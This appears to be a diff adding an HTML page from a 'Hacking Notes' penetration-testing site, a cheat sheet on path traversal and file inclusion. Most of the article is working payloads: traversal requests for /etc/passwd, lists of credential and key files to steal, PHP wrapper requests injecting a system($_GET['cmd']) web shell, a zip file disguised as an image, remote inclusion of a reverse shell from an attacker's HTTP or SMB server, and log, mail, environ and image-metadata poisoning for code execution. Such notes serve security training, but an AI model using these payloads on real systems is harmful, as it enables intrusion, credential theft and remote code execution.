@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>File Inclusion | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="File Inclusion" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="File Inclusion refers to an inclusion attack through which an attacker can trick the web application into including files on the web server." />
+<meta property="og:description" content="File Inclusion refers to an inclusion attack through which an attacker can trick the web application into including files on the web server." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/web/file-inclusion/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/web/file-inclusion/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"File Inclusion refers to an inclusion attack through which an attacker can trick the web application into including files on the web server.","url":"http://0.0.0.0:4000/hackingnotes/web/file-inclusion/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"File Inclusion","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item current"><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Web</h2>
+				<h3>File Inclusion</h3>
+			</div>
+			<article class="content">
+				<p>File Inclusion refers to an inclusion attack through which an attacker can trick the web application into including files on the web server.</p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Path Travesal can lead to two different types of File Inclusion:</p>
+
+<ul>
+  <li><strong>Local File Inclusion (LFI)</strong>: When is possible to include a local file.</li>
+  <li><strong>Remote File Inclusion (RFI)</strong>: When is possible to include remote files.</li>
+</ul>
+
+<h1 id="path-traversal">Path Traversal</h1>
+
+<p>Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.</p>
+
+<p><img src="/hackingnotes/images/pathtraversal.png" alt="Directory Traversal from PortSwigger Academy" /></p>
+
+<p>A search for path traversals begins with the examination of URL query strings and form bodies in search of values that appears as file references, including the most common indicator as file extensions.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src="/loadImage?filename=218.png"&gt;
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">loadImage</code> URL takes a <code class="highlighter-rouge">filename</code> parameter and returns the contents of the specified file. The image files themselves are stored on disk in the location <code class="highlighter-rouge">/var/www/images/</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/images/218.png
+</code></pre></div></div>
+
+<p>So we can request the following url to retrieve an arbitrary file from the server’s filesystem:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://insecure-website.com/loadImage?filename=../../../etc/passwd
+</code></pre></div></div>
+
+<p>This causes the application to read from the following file path <code class="highlighter-rouge">/var/www/images/../../../etc/passwd</code></p>
+
+<h1 id="interesting-files">Interesting Files</h1>
+
+<p>There are some interesting files to read, such as information about the server (users, groups), logs, etc…</p>
+
+<h2 id="linux">Linux</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/group
+/etc/hostname
+/etc/ssh/ssh_config
+/etc/ssh/sshd_config
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/user/.ssh/authorized_keys
+/home/user/.ssh/id_rsa
+/proc/[0-9]*/fd/[0-9]*
+/proc/mounts
+/home/$USER/.bash_history
+/home/$USER/.ssh/id_rsa
+/var/run/secrets/kubernetes.io/serviceaccount
+/var/lib/mlocate/mlocate.db
+/var/lib/mlocate.db
+</code></pre></div></div>
+
+<h2 id="apache">Apache</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/apache2/apache2.conf
+/usr/local/etc/apache2/httpd.conf
+/etc/httpd/conf/httpd.conf
+Red Hat/CentOS/Fedora Linux -&gt; /var/log/httpd/access_log
+Debian/Ubuntu -&gt; /var/log/apache2/access.log
+FreeBSD -&gt; /var/log/httpd-access.log
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/apache2/access.log
+/var/log/apache/error.log
+</code></pre></div></div>
+
+<h2 id="mysql">MySQL</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/lib/mysql/mysql/user.frm
+/var/lib/mysql/mysql/user.MYD
+/var/lib/mysql/mysql/user.MYI
+</code></pre></div></div>
+
+<h2 id="windows">Windows</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/boot.ini
+/autoexec.bat
+/windows/system32/drivers/etc/hosts
+/windows/repair/SAM
+/windows/panther/unattended.xml
+/windows/panther/unattend/unattended.xml
+/windows/system32/license.rtf
+/windows/system32/eula.txt
+</code></pre></div></div>
+
+<h1 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h1>
+
+<p>Its similar to Path Traversal but not exactly the same, the difference is, in file inclusion if we include a <strong>PHP</strong> it will be interpreted and executed while in path traversal not.</p>
+
+<h2 id="php-wrappers">PHP Wrappers</h2>
+
+<p>PHP provides several protocols wrappers that we can use to exploit path traversal and local file inclusion vulnerabilities. These filters give us additional flexibility when attempting to inject PHP code via LFI vulnerabilities.</p>
+
+<h3 id="wrapper-data">Wrapper data://</h3>
+
+<p>Used to embed inline data as part of the URL with plaintext or base64.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/include.php?file=data:text/plain,&lt;?php system($_GET["cmd"]);?&gt;&amp;cmd=id
+/include.php?file=data:,&lt;?php system($_GET["cmd"]);?&gt;&amp;cmd=id
+/include.php?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&amp;cmd=id
+</code></pre></div></div>
+
+<h3 id="wrapper-filter">Wrapper filter://</h3>
+
+<p>Used to encode/convert files. Usefull to read php files. The part of <code class="highlighter-rouge">php://filte</code>r is case insensitive.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/include.php?file=php://filter/read=string.rot13/resource=file.php
+/include.php?file=php://filter/conver.base64-encode/resource=file.php
+/include.php?file=pHp://Filter/conver.base64-encode/resource=file.php
+/include.php?file=php://filter/zlib.deflate/convert.base64-encode/resource=file.php
+</code></pre></div></div>
+
+<p>To read the compression data you need to decode the base64 and read the resulting data using:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -a
+readfile('php://filter/zlib.inflate/resource=test.deflated');
+</code></pre></div></div>
+
+<h3 id="wrapper-zip">Wrapper zip://</h3>
+
+<p>Upload a Zip file with a PHPShell inside and access it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"&lt;pre&gt;&lt;?php system(</span><span class="nv">$_GET</span><span class="s2">['cmd']); ?&gt;&lt;/pre&gt;"</span> <span class="o">&gt;</span> payload.php<span class="p">;</span>  
+zip payload.zip payload.php<span class="p">;</span>
+<span class="nb">mv </span>payload.zip shell.jpg<span class="p">;</span>
+<span class="nb">rm </span>payload.php
+
+http://example.com/index.php?page<span class="o">=</span>zip://shell.jpg%23payload.php
+</code></pre></div></div>
+
+<h3 id="wrapper-expect">Wrapper expect://</h3>
+
+<p>Used to execute code.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/include.php?file=except://id
+</code></pre></div></div>
+
+<h3 id="wrapper-input">Wrapper input://</h3>
+
+<p>Interpret php payload sent by POST parameters.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/include.php?file=php://input
+
+POST DATA: &lt;?php system($_GET["cmd"]);?&gt;
+</code></pre></div></div>
+
+<h1 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)</h1>
+
+<p>When we are able to include remote files to the application is synonym of remote code execution. We can include a webshell or a reverse shell.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/webshells/php/php-reverse-shell.php
+</code></pre></div></div>
+
+<p>Or you can create a php file with command execution or another type of reverse shell:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'whoami 2&gt;&amp;1'</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"</span><span class="nv">$output</span><span class="s2">"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Finally you only need to set up a HTTP server or SMB server and request the rev shell.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/include.php?file=http://ip-addr:port/php-reverse-shell.php
+/include.php?file=\\ip-addr\smbserver\php-reverse-shell.php
+</code></pre></div></div>
+
+<p>Some times <code class="highlighter-rouge">impacket-smbserver</code> doesn’t works due to the outdated SMB version of the target machine and we need to configure it manually.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cat /etc/samba/smb.conf
+[global]
+        server role = standalone server
+        map to guest = Bad User
+        usershare allow guest = yes
+        host allow = &lt;ip-target-machine&gt;
+
+[badsmb]
+        path = &lt;directory&gt;
+        browseable = yes
+        read only = no
+        guest ok = yes
+</code></pre></div></div>
+
+<h1 id="looking-to-rce">Looking to RCE</h1>
+
+<p>There are several ways to escalate a LFI to a RCE.</p>
+
+<h2 id="via-log-poisoning">Via Log Poisoning</h2>
+
+<p>We can poison the logs with the user agent.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.O
+Host: example.com
+User-Agent: &lt;?php system($_GET["cmd"]);?&gt;
+</code></pre></div></div>
+
+<p>And try to access to <code class="highlighter-rouge">/var/log/apache2/access.log</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/include.php?file=../../../../var/log/apache2/access.log&amp;cmd=id
+</code></pre></div></div>
+
+<h2 id="via-email">Via Email</h2>
+
+<p>If SMTP is open in the server we can easily send a mail to an internal account. “user@localhost” containing the following payload <code class="highlighter-rouge"><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span><span class="cp">?&gt;</span></code></p>
+
+<p>And access to the mail inbox of the user.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/include.php?file=../../../../var/mail/user&amp;cmd=id
+</code></pre></div></div>
+
+<h2 id="via-environ">Via Environ</h2>
+
+<p>Like a log file, sending the payload in the User-Agent, it will be reflected inside the /proc/self/environ file.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /include.php?file=../../../../proc/self/environ&amp;cmd=id HTTP/1.O
+Host: example.com
+User-Agent: &lt;?php system($_GET["cmd"]);?&gt;
+</code></pre></div></div>
+
+<h2 id="via-upload">Via Upload</h2>
+
+<p>If exists a functionality that leads us to upload an arbitrary file, we can upload directly a reverse shell or simply upload a image with the payload injected on metadata.</p>
+
+<p>To modify metadata of a file we can use exiftool.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool -DocumentName='&lt;?php system($_GET["cmd"]);?&gt;' myimage.jpg
+</code></pre></div></div>
+
+<p>Once uploaded we can access it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/include.php?file=../../uploads/myimage.jpg&amp;cmd=id
+</code></pre></div></div>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/file-path-traversal">https://portswigger.net/web-security/file-path-traversal</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">https://book.hacktricks.xyz/pentesting-web/file-inclusion</a></li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
